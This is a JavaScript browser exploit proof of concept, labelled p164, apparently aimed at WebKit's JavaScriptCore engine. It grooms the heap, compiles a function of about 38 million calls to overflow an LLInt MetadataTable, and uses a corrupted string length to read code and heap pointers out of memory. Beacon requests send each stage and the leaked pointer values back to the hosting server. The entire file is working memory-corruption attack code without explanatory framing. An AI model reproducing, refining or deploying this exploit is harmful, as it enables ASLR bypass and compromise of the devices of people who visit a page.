// p164 — Focused pointer extraction from MetadataTable overflow
//
// Based on StringImpl layout analysis:
//   StringImpl: m_refCount(0) m_length(4) m_data8(8) m_hashAndFlags(16) data(20+)
//   p156 showed: m_length overwritten by m_bytecodeIndex at entry+68
//   → StringImpl starts at entry+64, char data at entry+84
//
// LLInt writes these fields per op_call execution:
//   entry+48: m_calleeOrCodeBlock (8B heap pointer)
//   entry+56: m_lastSeenCalleeOrExecutable (8B heap pointer)
//   entry+68: m_bytecodeIndex (4B)
//
// In char data space (starts at entry+84 = charCodeAt(0)):
//   NEXT entry's m_calleeOrCodeBlock at charCodeAt(112+48-84) = charCodeAt(76)
//   NEXT entry's m_lastSeenCalleeOrExecutable at charCodeAt(112+56-84) = charCodeAt(84)
//   NEXT entry's m_bytecodeIndex at charCodeAt(112+68-84) = charCodeAt(96)
//   NEXT entry's m_slowPathCallDestination at charCodeAt(112+24-84) = charCodeAt(52)
//   TWO AHEAD: m_calleeOrCodeBlock at charCodeAt(224+48-84) = charCodeAt(188)
//
// Beacon prefix: V164-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var q = [];
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', BASE + '/beacon/V164-' + tag + '?t=' + Date.now(), true);
      x.send();
    } catch(e) {}
  }
  function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }

  B('BOOT');

  // ── WORKER ──
  var workerCode = function() {
    var targets = [];
    var baseUrl = '';
    var STR_LEN = 100000;
    var CANARY = 0x41;

    function beacon(tag) {
      try {
        var x = new XMLHttpRequest();
        x.open('GET', baseUrl + '/beacon/V164-W-' + tag + '?t=' + Date.now(), true);
        x.send();
      } catch(e) {}
    }
    function hx(v) { return (v < 16 ? '0' : '') + v.toString(16); }
    function hx16(v) {
      var s = '';
      for (var i = 3; i >= 0; i--) s += hx((v >> (i*8)) & 0xff);
      return s;
    }

    // Read 8 bytes as hex (little-endian pointer)
    function readPtr(str, off) {
      var h = '';
      for (var i = 7; i >= 0; i--) {
        try { h += hx(str.charCodeAt(off + i)); }
        catch(e) { h += 'XX'; }
      }
      return h;
    }

    // Read 4 bytes as hex (little-endian u32)
    function readU32(str, off) {
      var h = '';
      for (var i = 3; i >= 0; i--) {
        try { h += hx(str.charCodeAt(off + i)); }
        catch(e) { h += 'XX'; }
      }
      return h;
    }

    self.onmessage = function(e) {
      if (e.data.cmd === 'init') {
        baseUrl = e.data.baseUrl;
        beacon('ALIVE');
        return;
      }
      if (e.data.cmd === 'alloc') {
        var chunk = '';
        for (var k = 0; k < 100; k++) chunk += 'AAAAAAAAAA';
        for (var i = 0; i < 14; i++) {
          var s = '';
          for (var j = 0; j < STR_LEN; j += 1000) s += chunk;
          s = s.substring(0, STR_LEN);
          s.charCodeAt(0);
          targets.push(s);
        }
        beacon('TARGETS-' + targets.length);
        self.postMessage({ ready: true });
        return;
      }
      if (e.data.cmd === 'watch') {
        beacon('WATCHING');
        var found = -1;
        var iters = 0;

        // DETECTION: .length ONLY (proven in p156)
        while (found < 0) {
          for (var i = 0; i < targets.length; i++) {
            if (targets[i].length !== STR_LEN) {
              found = i;
              break;
            }
          }
          iters++;
          if (iters % 500000 === 0) beacon('POLL-' + iters);
          if (iters > 50000000) { beacon('TIMEOUT'); return; }
        }

        beacon('HIT-' + found + '-len=' + targets[found].length);

        // Count how many strings are corrupted
        var corrupted = [];
        for (var i = 0; i < targets.length; i++) {
          if (targets[i].length !== STR_LEN) {
            corrupted.push(i);
          }
        }
        beacon('CORRUPT-' + corrupted.length + '-idx=' + corrupted.join(','));

        // ── FOCUSED EXTRACTION on first corrupted string ──
        var ci = corrupted[0];
        var s = targets[ci];
        var len = s.length;

        beacon('EXTRACT-' + ci + '-len=' + len);

        // Check if len > 0 and readable
        if (len <= 0 || len > 200000) {
          beacon('BADLEN-' + len);
          if (corrupted.length > 1) {
            ci = corrupted[1];
            s = targets[ci];
            len = s.length;
            beacon('TRY2-' + ci + '-len=' + len);
          }
          if (len <= 0 || len > 200000) { beacon('ABORT'); return; }
        }

        var maxRead = Math.min(len, 500);

        // ── PRIORITY: KEY OFFSET READS FIRST (most valuable data) ──
        // Theory: StringImpl at entry+64, char data at entry+84
        // charCodeAt(N) reads entry byte at 84+N
        // Next entry starts at entry+112

        // CURRENT entry written fields (before char data start = negative offset, can't read):
        //   entry+48 m_calleeOrCodeBlock: charCodeAt(48-84) = charCodeAt(-36) → CAN'T READ
        //   entry+68 m_bytecodeIndex: shown as m_length already

        // NEXT ENTRY (entry+112) written fields:
        // m_slowPathCallDestination (code ptr): charCodeAt(112+24-84)=charCodeAt(52)
        var off52 = readPtr(s, 52);
        beacon('OFF52-CPTR=' + off52);

        // m_calleeOrCodeBlock (heap ptr): charCodeAt(112+48-84)=charCodeAt(76)
        var off76 = readPtr(s, 76);
        beacon('OFF76-CALLEE=' + off76);

        // m_lastSeenCalleeOrExecutable: charCodeAt(112+56-84)=charCodeAt(84)
        var off84 = readPtr(s, 84);
        beacon('OFF84-EXEC=' + off84);

        // m_bytecodeIndex: charCodeAt(112+68-84)=charCodeAt(96)
        var off96 = readU32(s, 96);
        beacon('OFF96-BCI=' + off96);

        // ENTRY +2 (entry+224):
        // m_slowPathCallDestination: charCodeAt(224+24-84)=charCodeAt(164)
        if (164 + 8 <= maxRead) {
          var off164 = readPtr(s, 164);
          beacon('OFF164-CPTR2=' + off164);
        }

        // m_calleeOrCodeBlock: charCodeAt(224+48-84)=charCodeAt(188)
        if (188 + 8 <= maxRead) {
          var off188 = readPtr(s, 188);
          beacon('OFF188-CALLEE2=' + off188);
        }

        // m_bytecodeIndex: charCodeAt(224+68-84)=charCodeAt(208)
        if (208 + 4 <= maxRead) {
          var off208 = readU32(s, 208);
          beacon('OFF208-BCI2=' + off208);
        }

        // ENTRY +3 (entry+336):
        // m_slowPathCallDestination: charCodeAt(336+24-84)=charCodeAt(276)
        if (276 + 8 <= maxRead) {
          var off276 = readPtr(s, 276);
          beacon('OFF276-CPTR3=' + off276);
        }

        // ── NON-CANARY SCAN (secondary: find actual alignment) ──
        var ncList = '';
        for (var b = 0; b < Math.min(300, maxRead); b++) {
          try {
            var ch = s.charCodeAt(b);
            if (ch !== CANARY) ncList += b + ':' + hx(ch) + ',';
          } catch(e) { break; }
        }
        if (ncList.length > 0) {
          beacon('NC-A=' + ncList.substring(0, 200));
          if (ncList.length > 200) beacon('NC-B=' + ncList.substring(200, 400));
        } else {
          beacon('NC-NONE-300');
        }

        // ── RAW HEX DUMP of bytes 40-100 (key region) ──
        var raw1 = '';
        for (var b = 40; b < Math.min(100, maxRead); b++) {
          try { raw1 += hx(s.charCodeAt(b)); }
          catch(e) { raw1 += 'XX'; break; }
        }
        beacon('RAW40=' + raw1);

        // Raw dump 100-160
        var raw2 = '';
        for (var b = 100; b < Math.min(160, maxRead); b++) {
          try { raw2 += hx(s.charCodeAt(b)); }
          catch(e) { raw2 += 'XX'; break; }
        }
        beacon('RAW100=' + raw2);

        // ── SECOND CORRUPTED STRING (for comparison) ──
        if (corrupted.length > 1) {
          var ci2 = corrupted[1];
          var s2 = targets[ci2];
          var len2 = s2.length;
          beacon('S2-' + ci2 + '-len=' + len2);
          if (len2 > 0 && len2 < 200000) {
            var off52b = readPtr(s2, 52);
            beacon('S2-OFF52=' + off52b);
            var off76b = readPtr(s2, 76);
            beacon('S2-OFF76=' + off76b);
            var off96b = readU32(s2, 96);
            beacon('S2-OFF96=' + off96b);
          }
        }

        beacon('DONE');
      }
    };
  };

  var workerBlob = new Blob(
    ['(' + workerCode.toString() + ')()'],
    { type: 'application/javascript' }
  );
  var worker = new Worker(URL.createObjectURL(workerBlob));
  worker.postMessage({ cmd: 'init', baseUrl: BASE });

  // ── PHASE 1: BAIT STRINGS — EXACT p156 ──
  var N_BAIT = 20;
  var STR_LEN = 100000;
  B('BAIT-START');
  var baits = [];
  var baitChunk = '';
  for (var k = 0; k < 100; k++) baitChunk += 'BBBBBBBBBB';
  for (var i = 0; i < N_BAIT; i++) {
    var bait = '';
    for (var j = 0; j < STR_LEN; j += 1000) bait += baitChunk;
    bait = bait.substring(0, STR_LEN);
    bait.charCodeAt(0);
    baits.push(bait);
  }
  baitChunk = null;
  B('BAIT-DONE-' + N_BAIT);

  // ── PHASE 2: ZERO PADDING (prevents OOB-read crash) ──
  var N_PAD = 30;
  B('PAD-START');
  var padding = [];
  for (var i = 0; i < N_PAD; i++) {
    padding.push(new ArrayBuffer(STR_LEN));
  }
  B('PAD-DONE-' + N_PAD);

  // ── PHASE 3: WORKER ALLOCATES TARGETS ──
  worker.onmessage = function(e) {
    if (e.data.ready) phaseFreeBaits();
  };
  B('WORKER-ALLOC');
  worker.postMessage({ cmd: 'alloc' });

  // ── PHASE 4: FREE BAITS + GC ──
  function phaseFreeBaits() {
    B('FREE-START');
    for (var i = 0; i < baits.length; i++) baits[i] = null;
    baits = null;

    var gcRound = 0;
    function gcPressureRound() {
      for (var j = 0; j < 1000; j++) new ArrayBuffer(8192);
      for (var j = 0; j < 500; j++) new Array(100).fill(gcRound);
      gcRound++;
      if (gcRound < 30) setTimeout(gcPressureRound, 30);
      else { B('GC-DONE-' + gcRound); phaseBuild(); }
    }
    gcPressureRound();
  }

  // ── PHASE 5: BUILD + CALL ──
  function phaseBuild() {
    B('BUILD-START');

    // Start worker watching BEFORE we build the function
    worker.postMessage({ cmd: 'watch' });

    var N = 38348816;
    var CHUNK = 4000000;
    var CHUNKS = Math.floor(N / CHUNK);
    var REM = N - CHUNKS * CHUNK;

    var callChunk = '';
    for (var c = 0; c < CHUNK; c++) callChunk += 'a();';
    var remChunk = '';
    for (var r = 0; r < REM; r++) remChunk += 'a();';

    var parts = ['window.__v164fn=function(a){'];
    for (var ch = 0; ch < CHUNKS; ch++) parts.push(callChunk);
    parts.push(remChunk);
    parts.push('};window.__v164ok=true;');

    var blob = new Blob(parts, { type: 'application/javascript' });
    B('BLOB-' + (blob.size / 1024 / 1024).toFixed(0) + 'MB');
    callChunk = null;
    remChunk = null;
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');

    sc.onload = function() {
      B('COMPILED-' + (window.__v164ok ? 'OK' : 'FAIL'));
      if (!window.__v164fn) { B('NO-FN'); return; }

      setTimeout(function() {
        B('CALLING');
        try {
          window.__v164fn(function(){});
        } catch(ex) {
          B('CATCH-' + (ex.message || '').substring(0, 30));
        }
        B('SURVIVED');
      }, 300);
    };

    sc.onerror = function() { B('SCRIPT-ERR'); };
    document.head.appendChild(sc);
    sc.src = url;
  }
})();
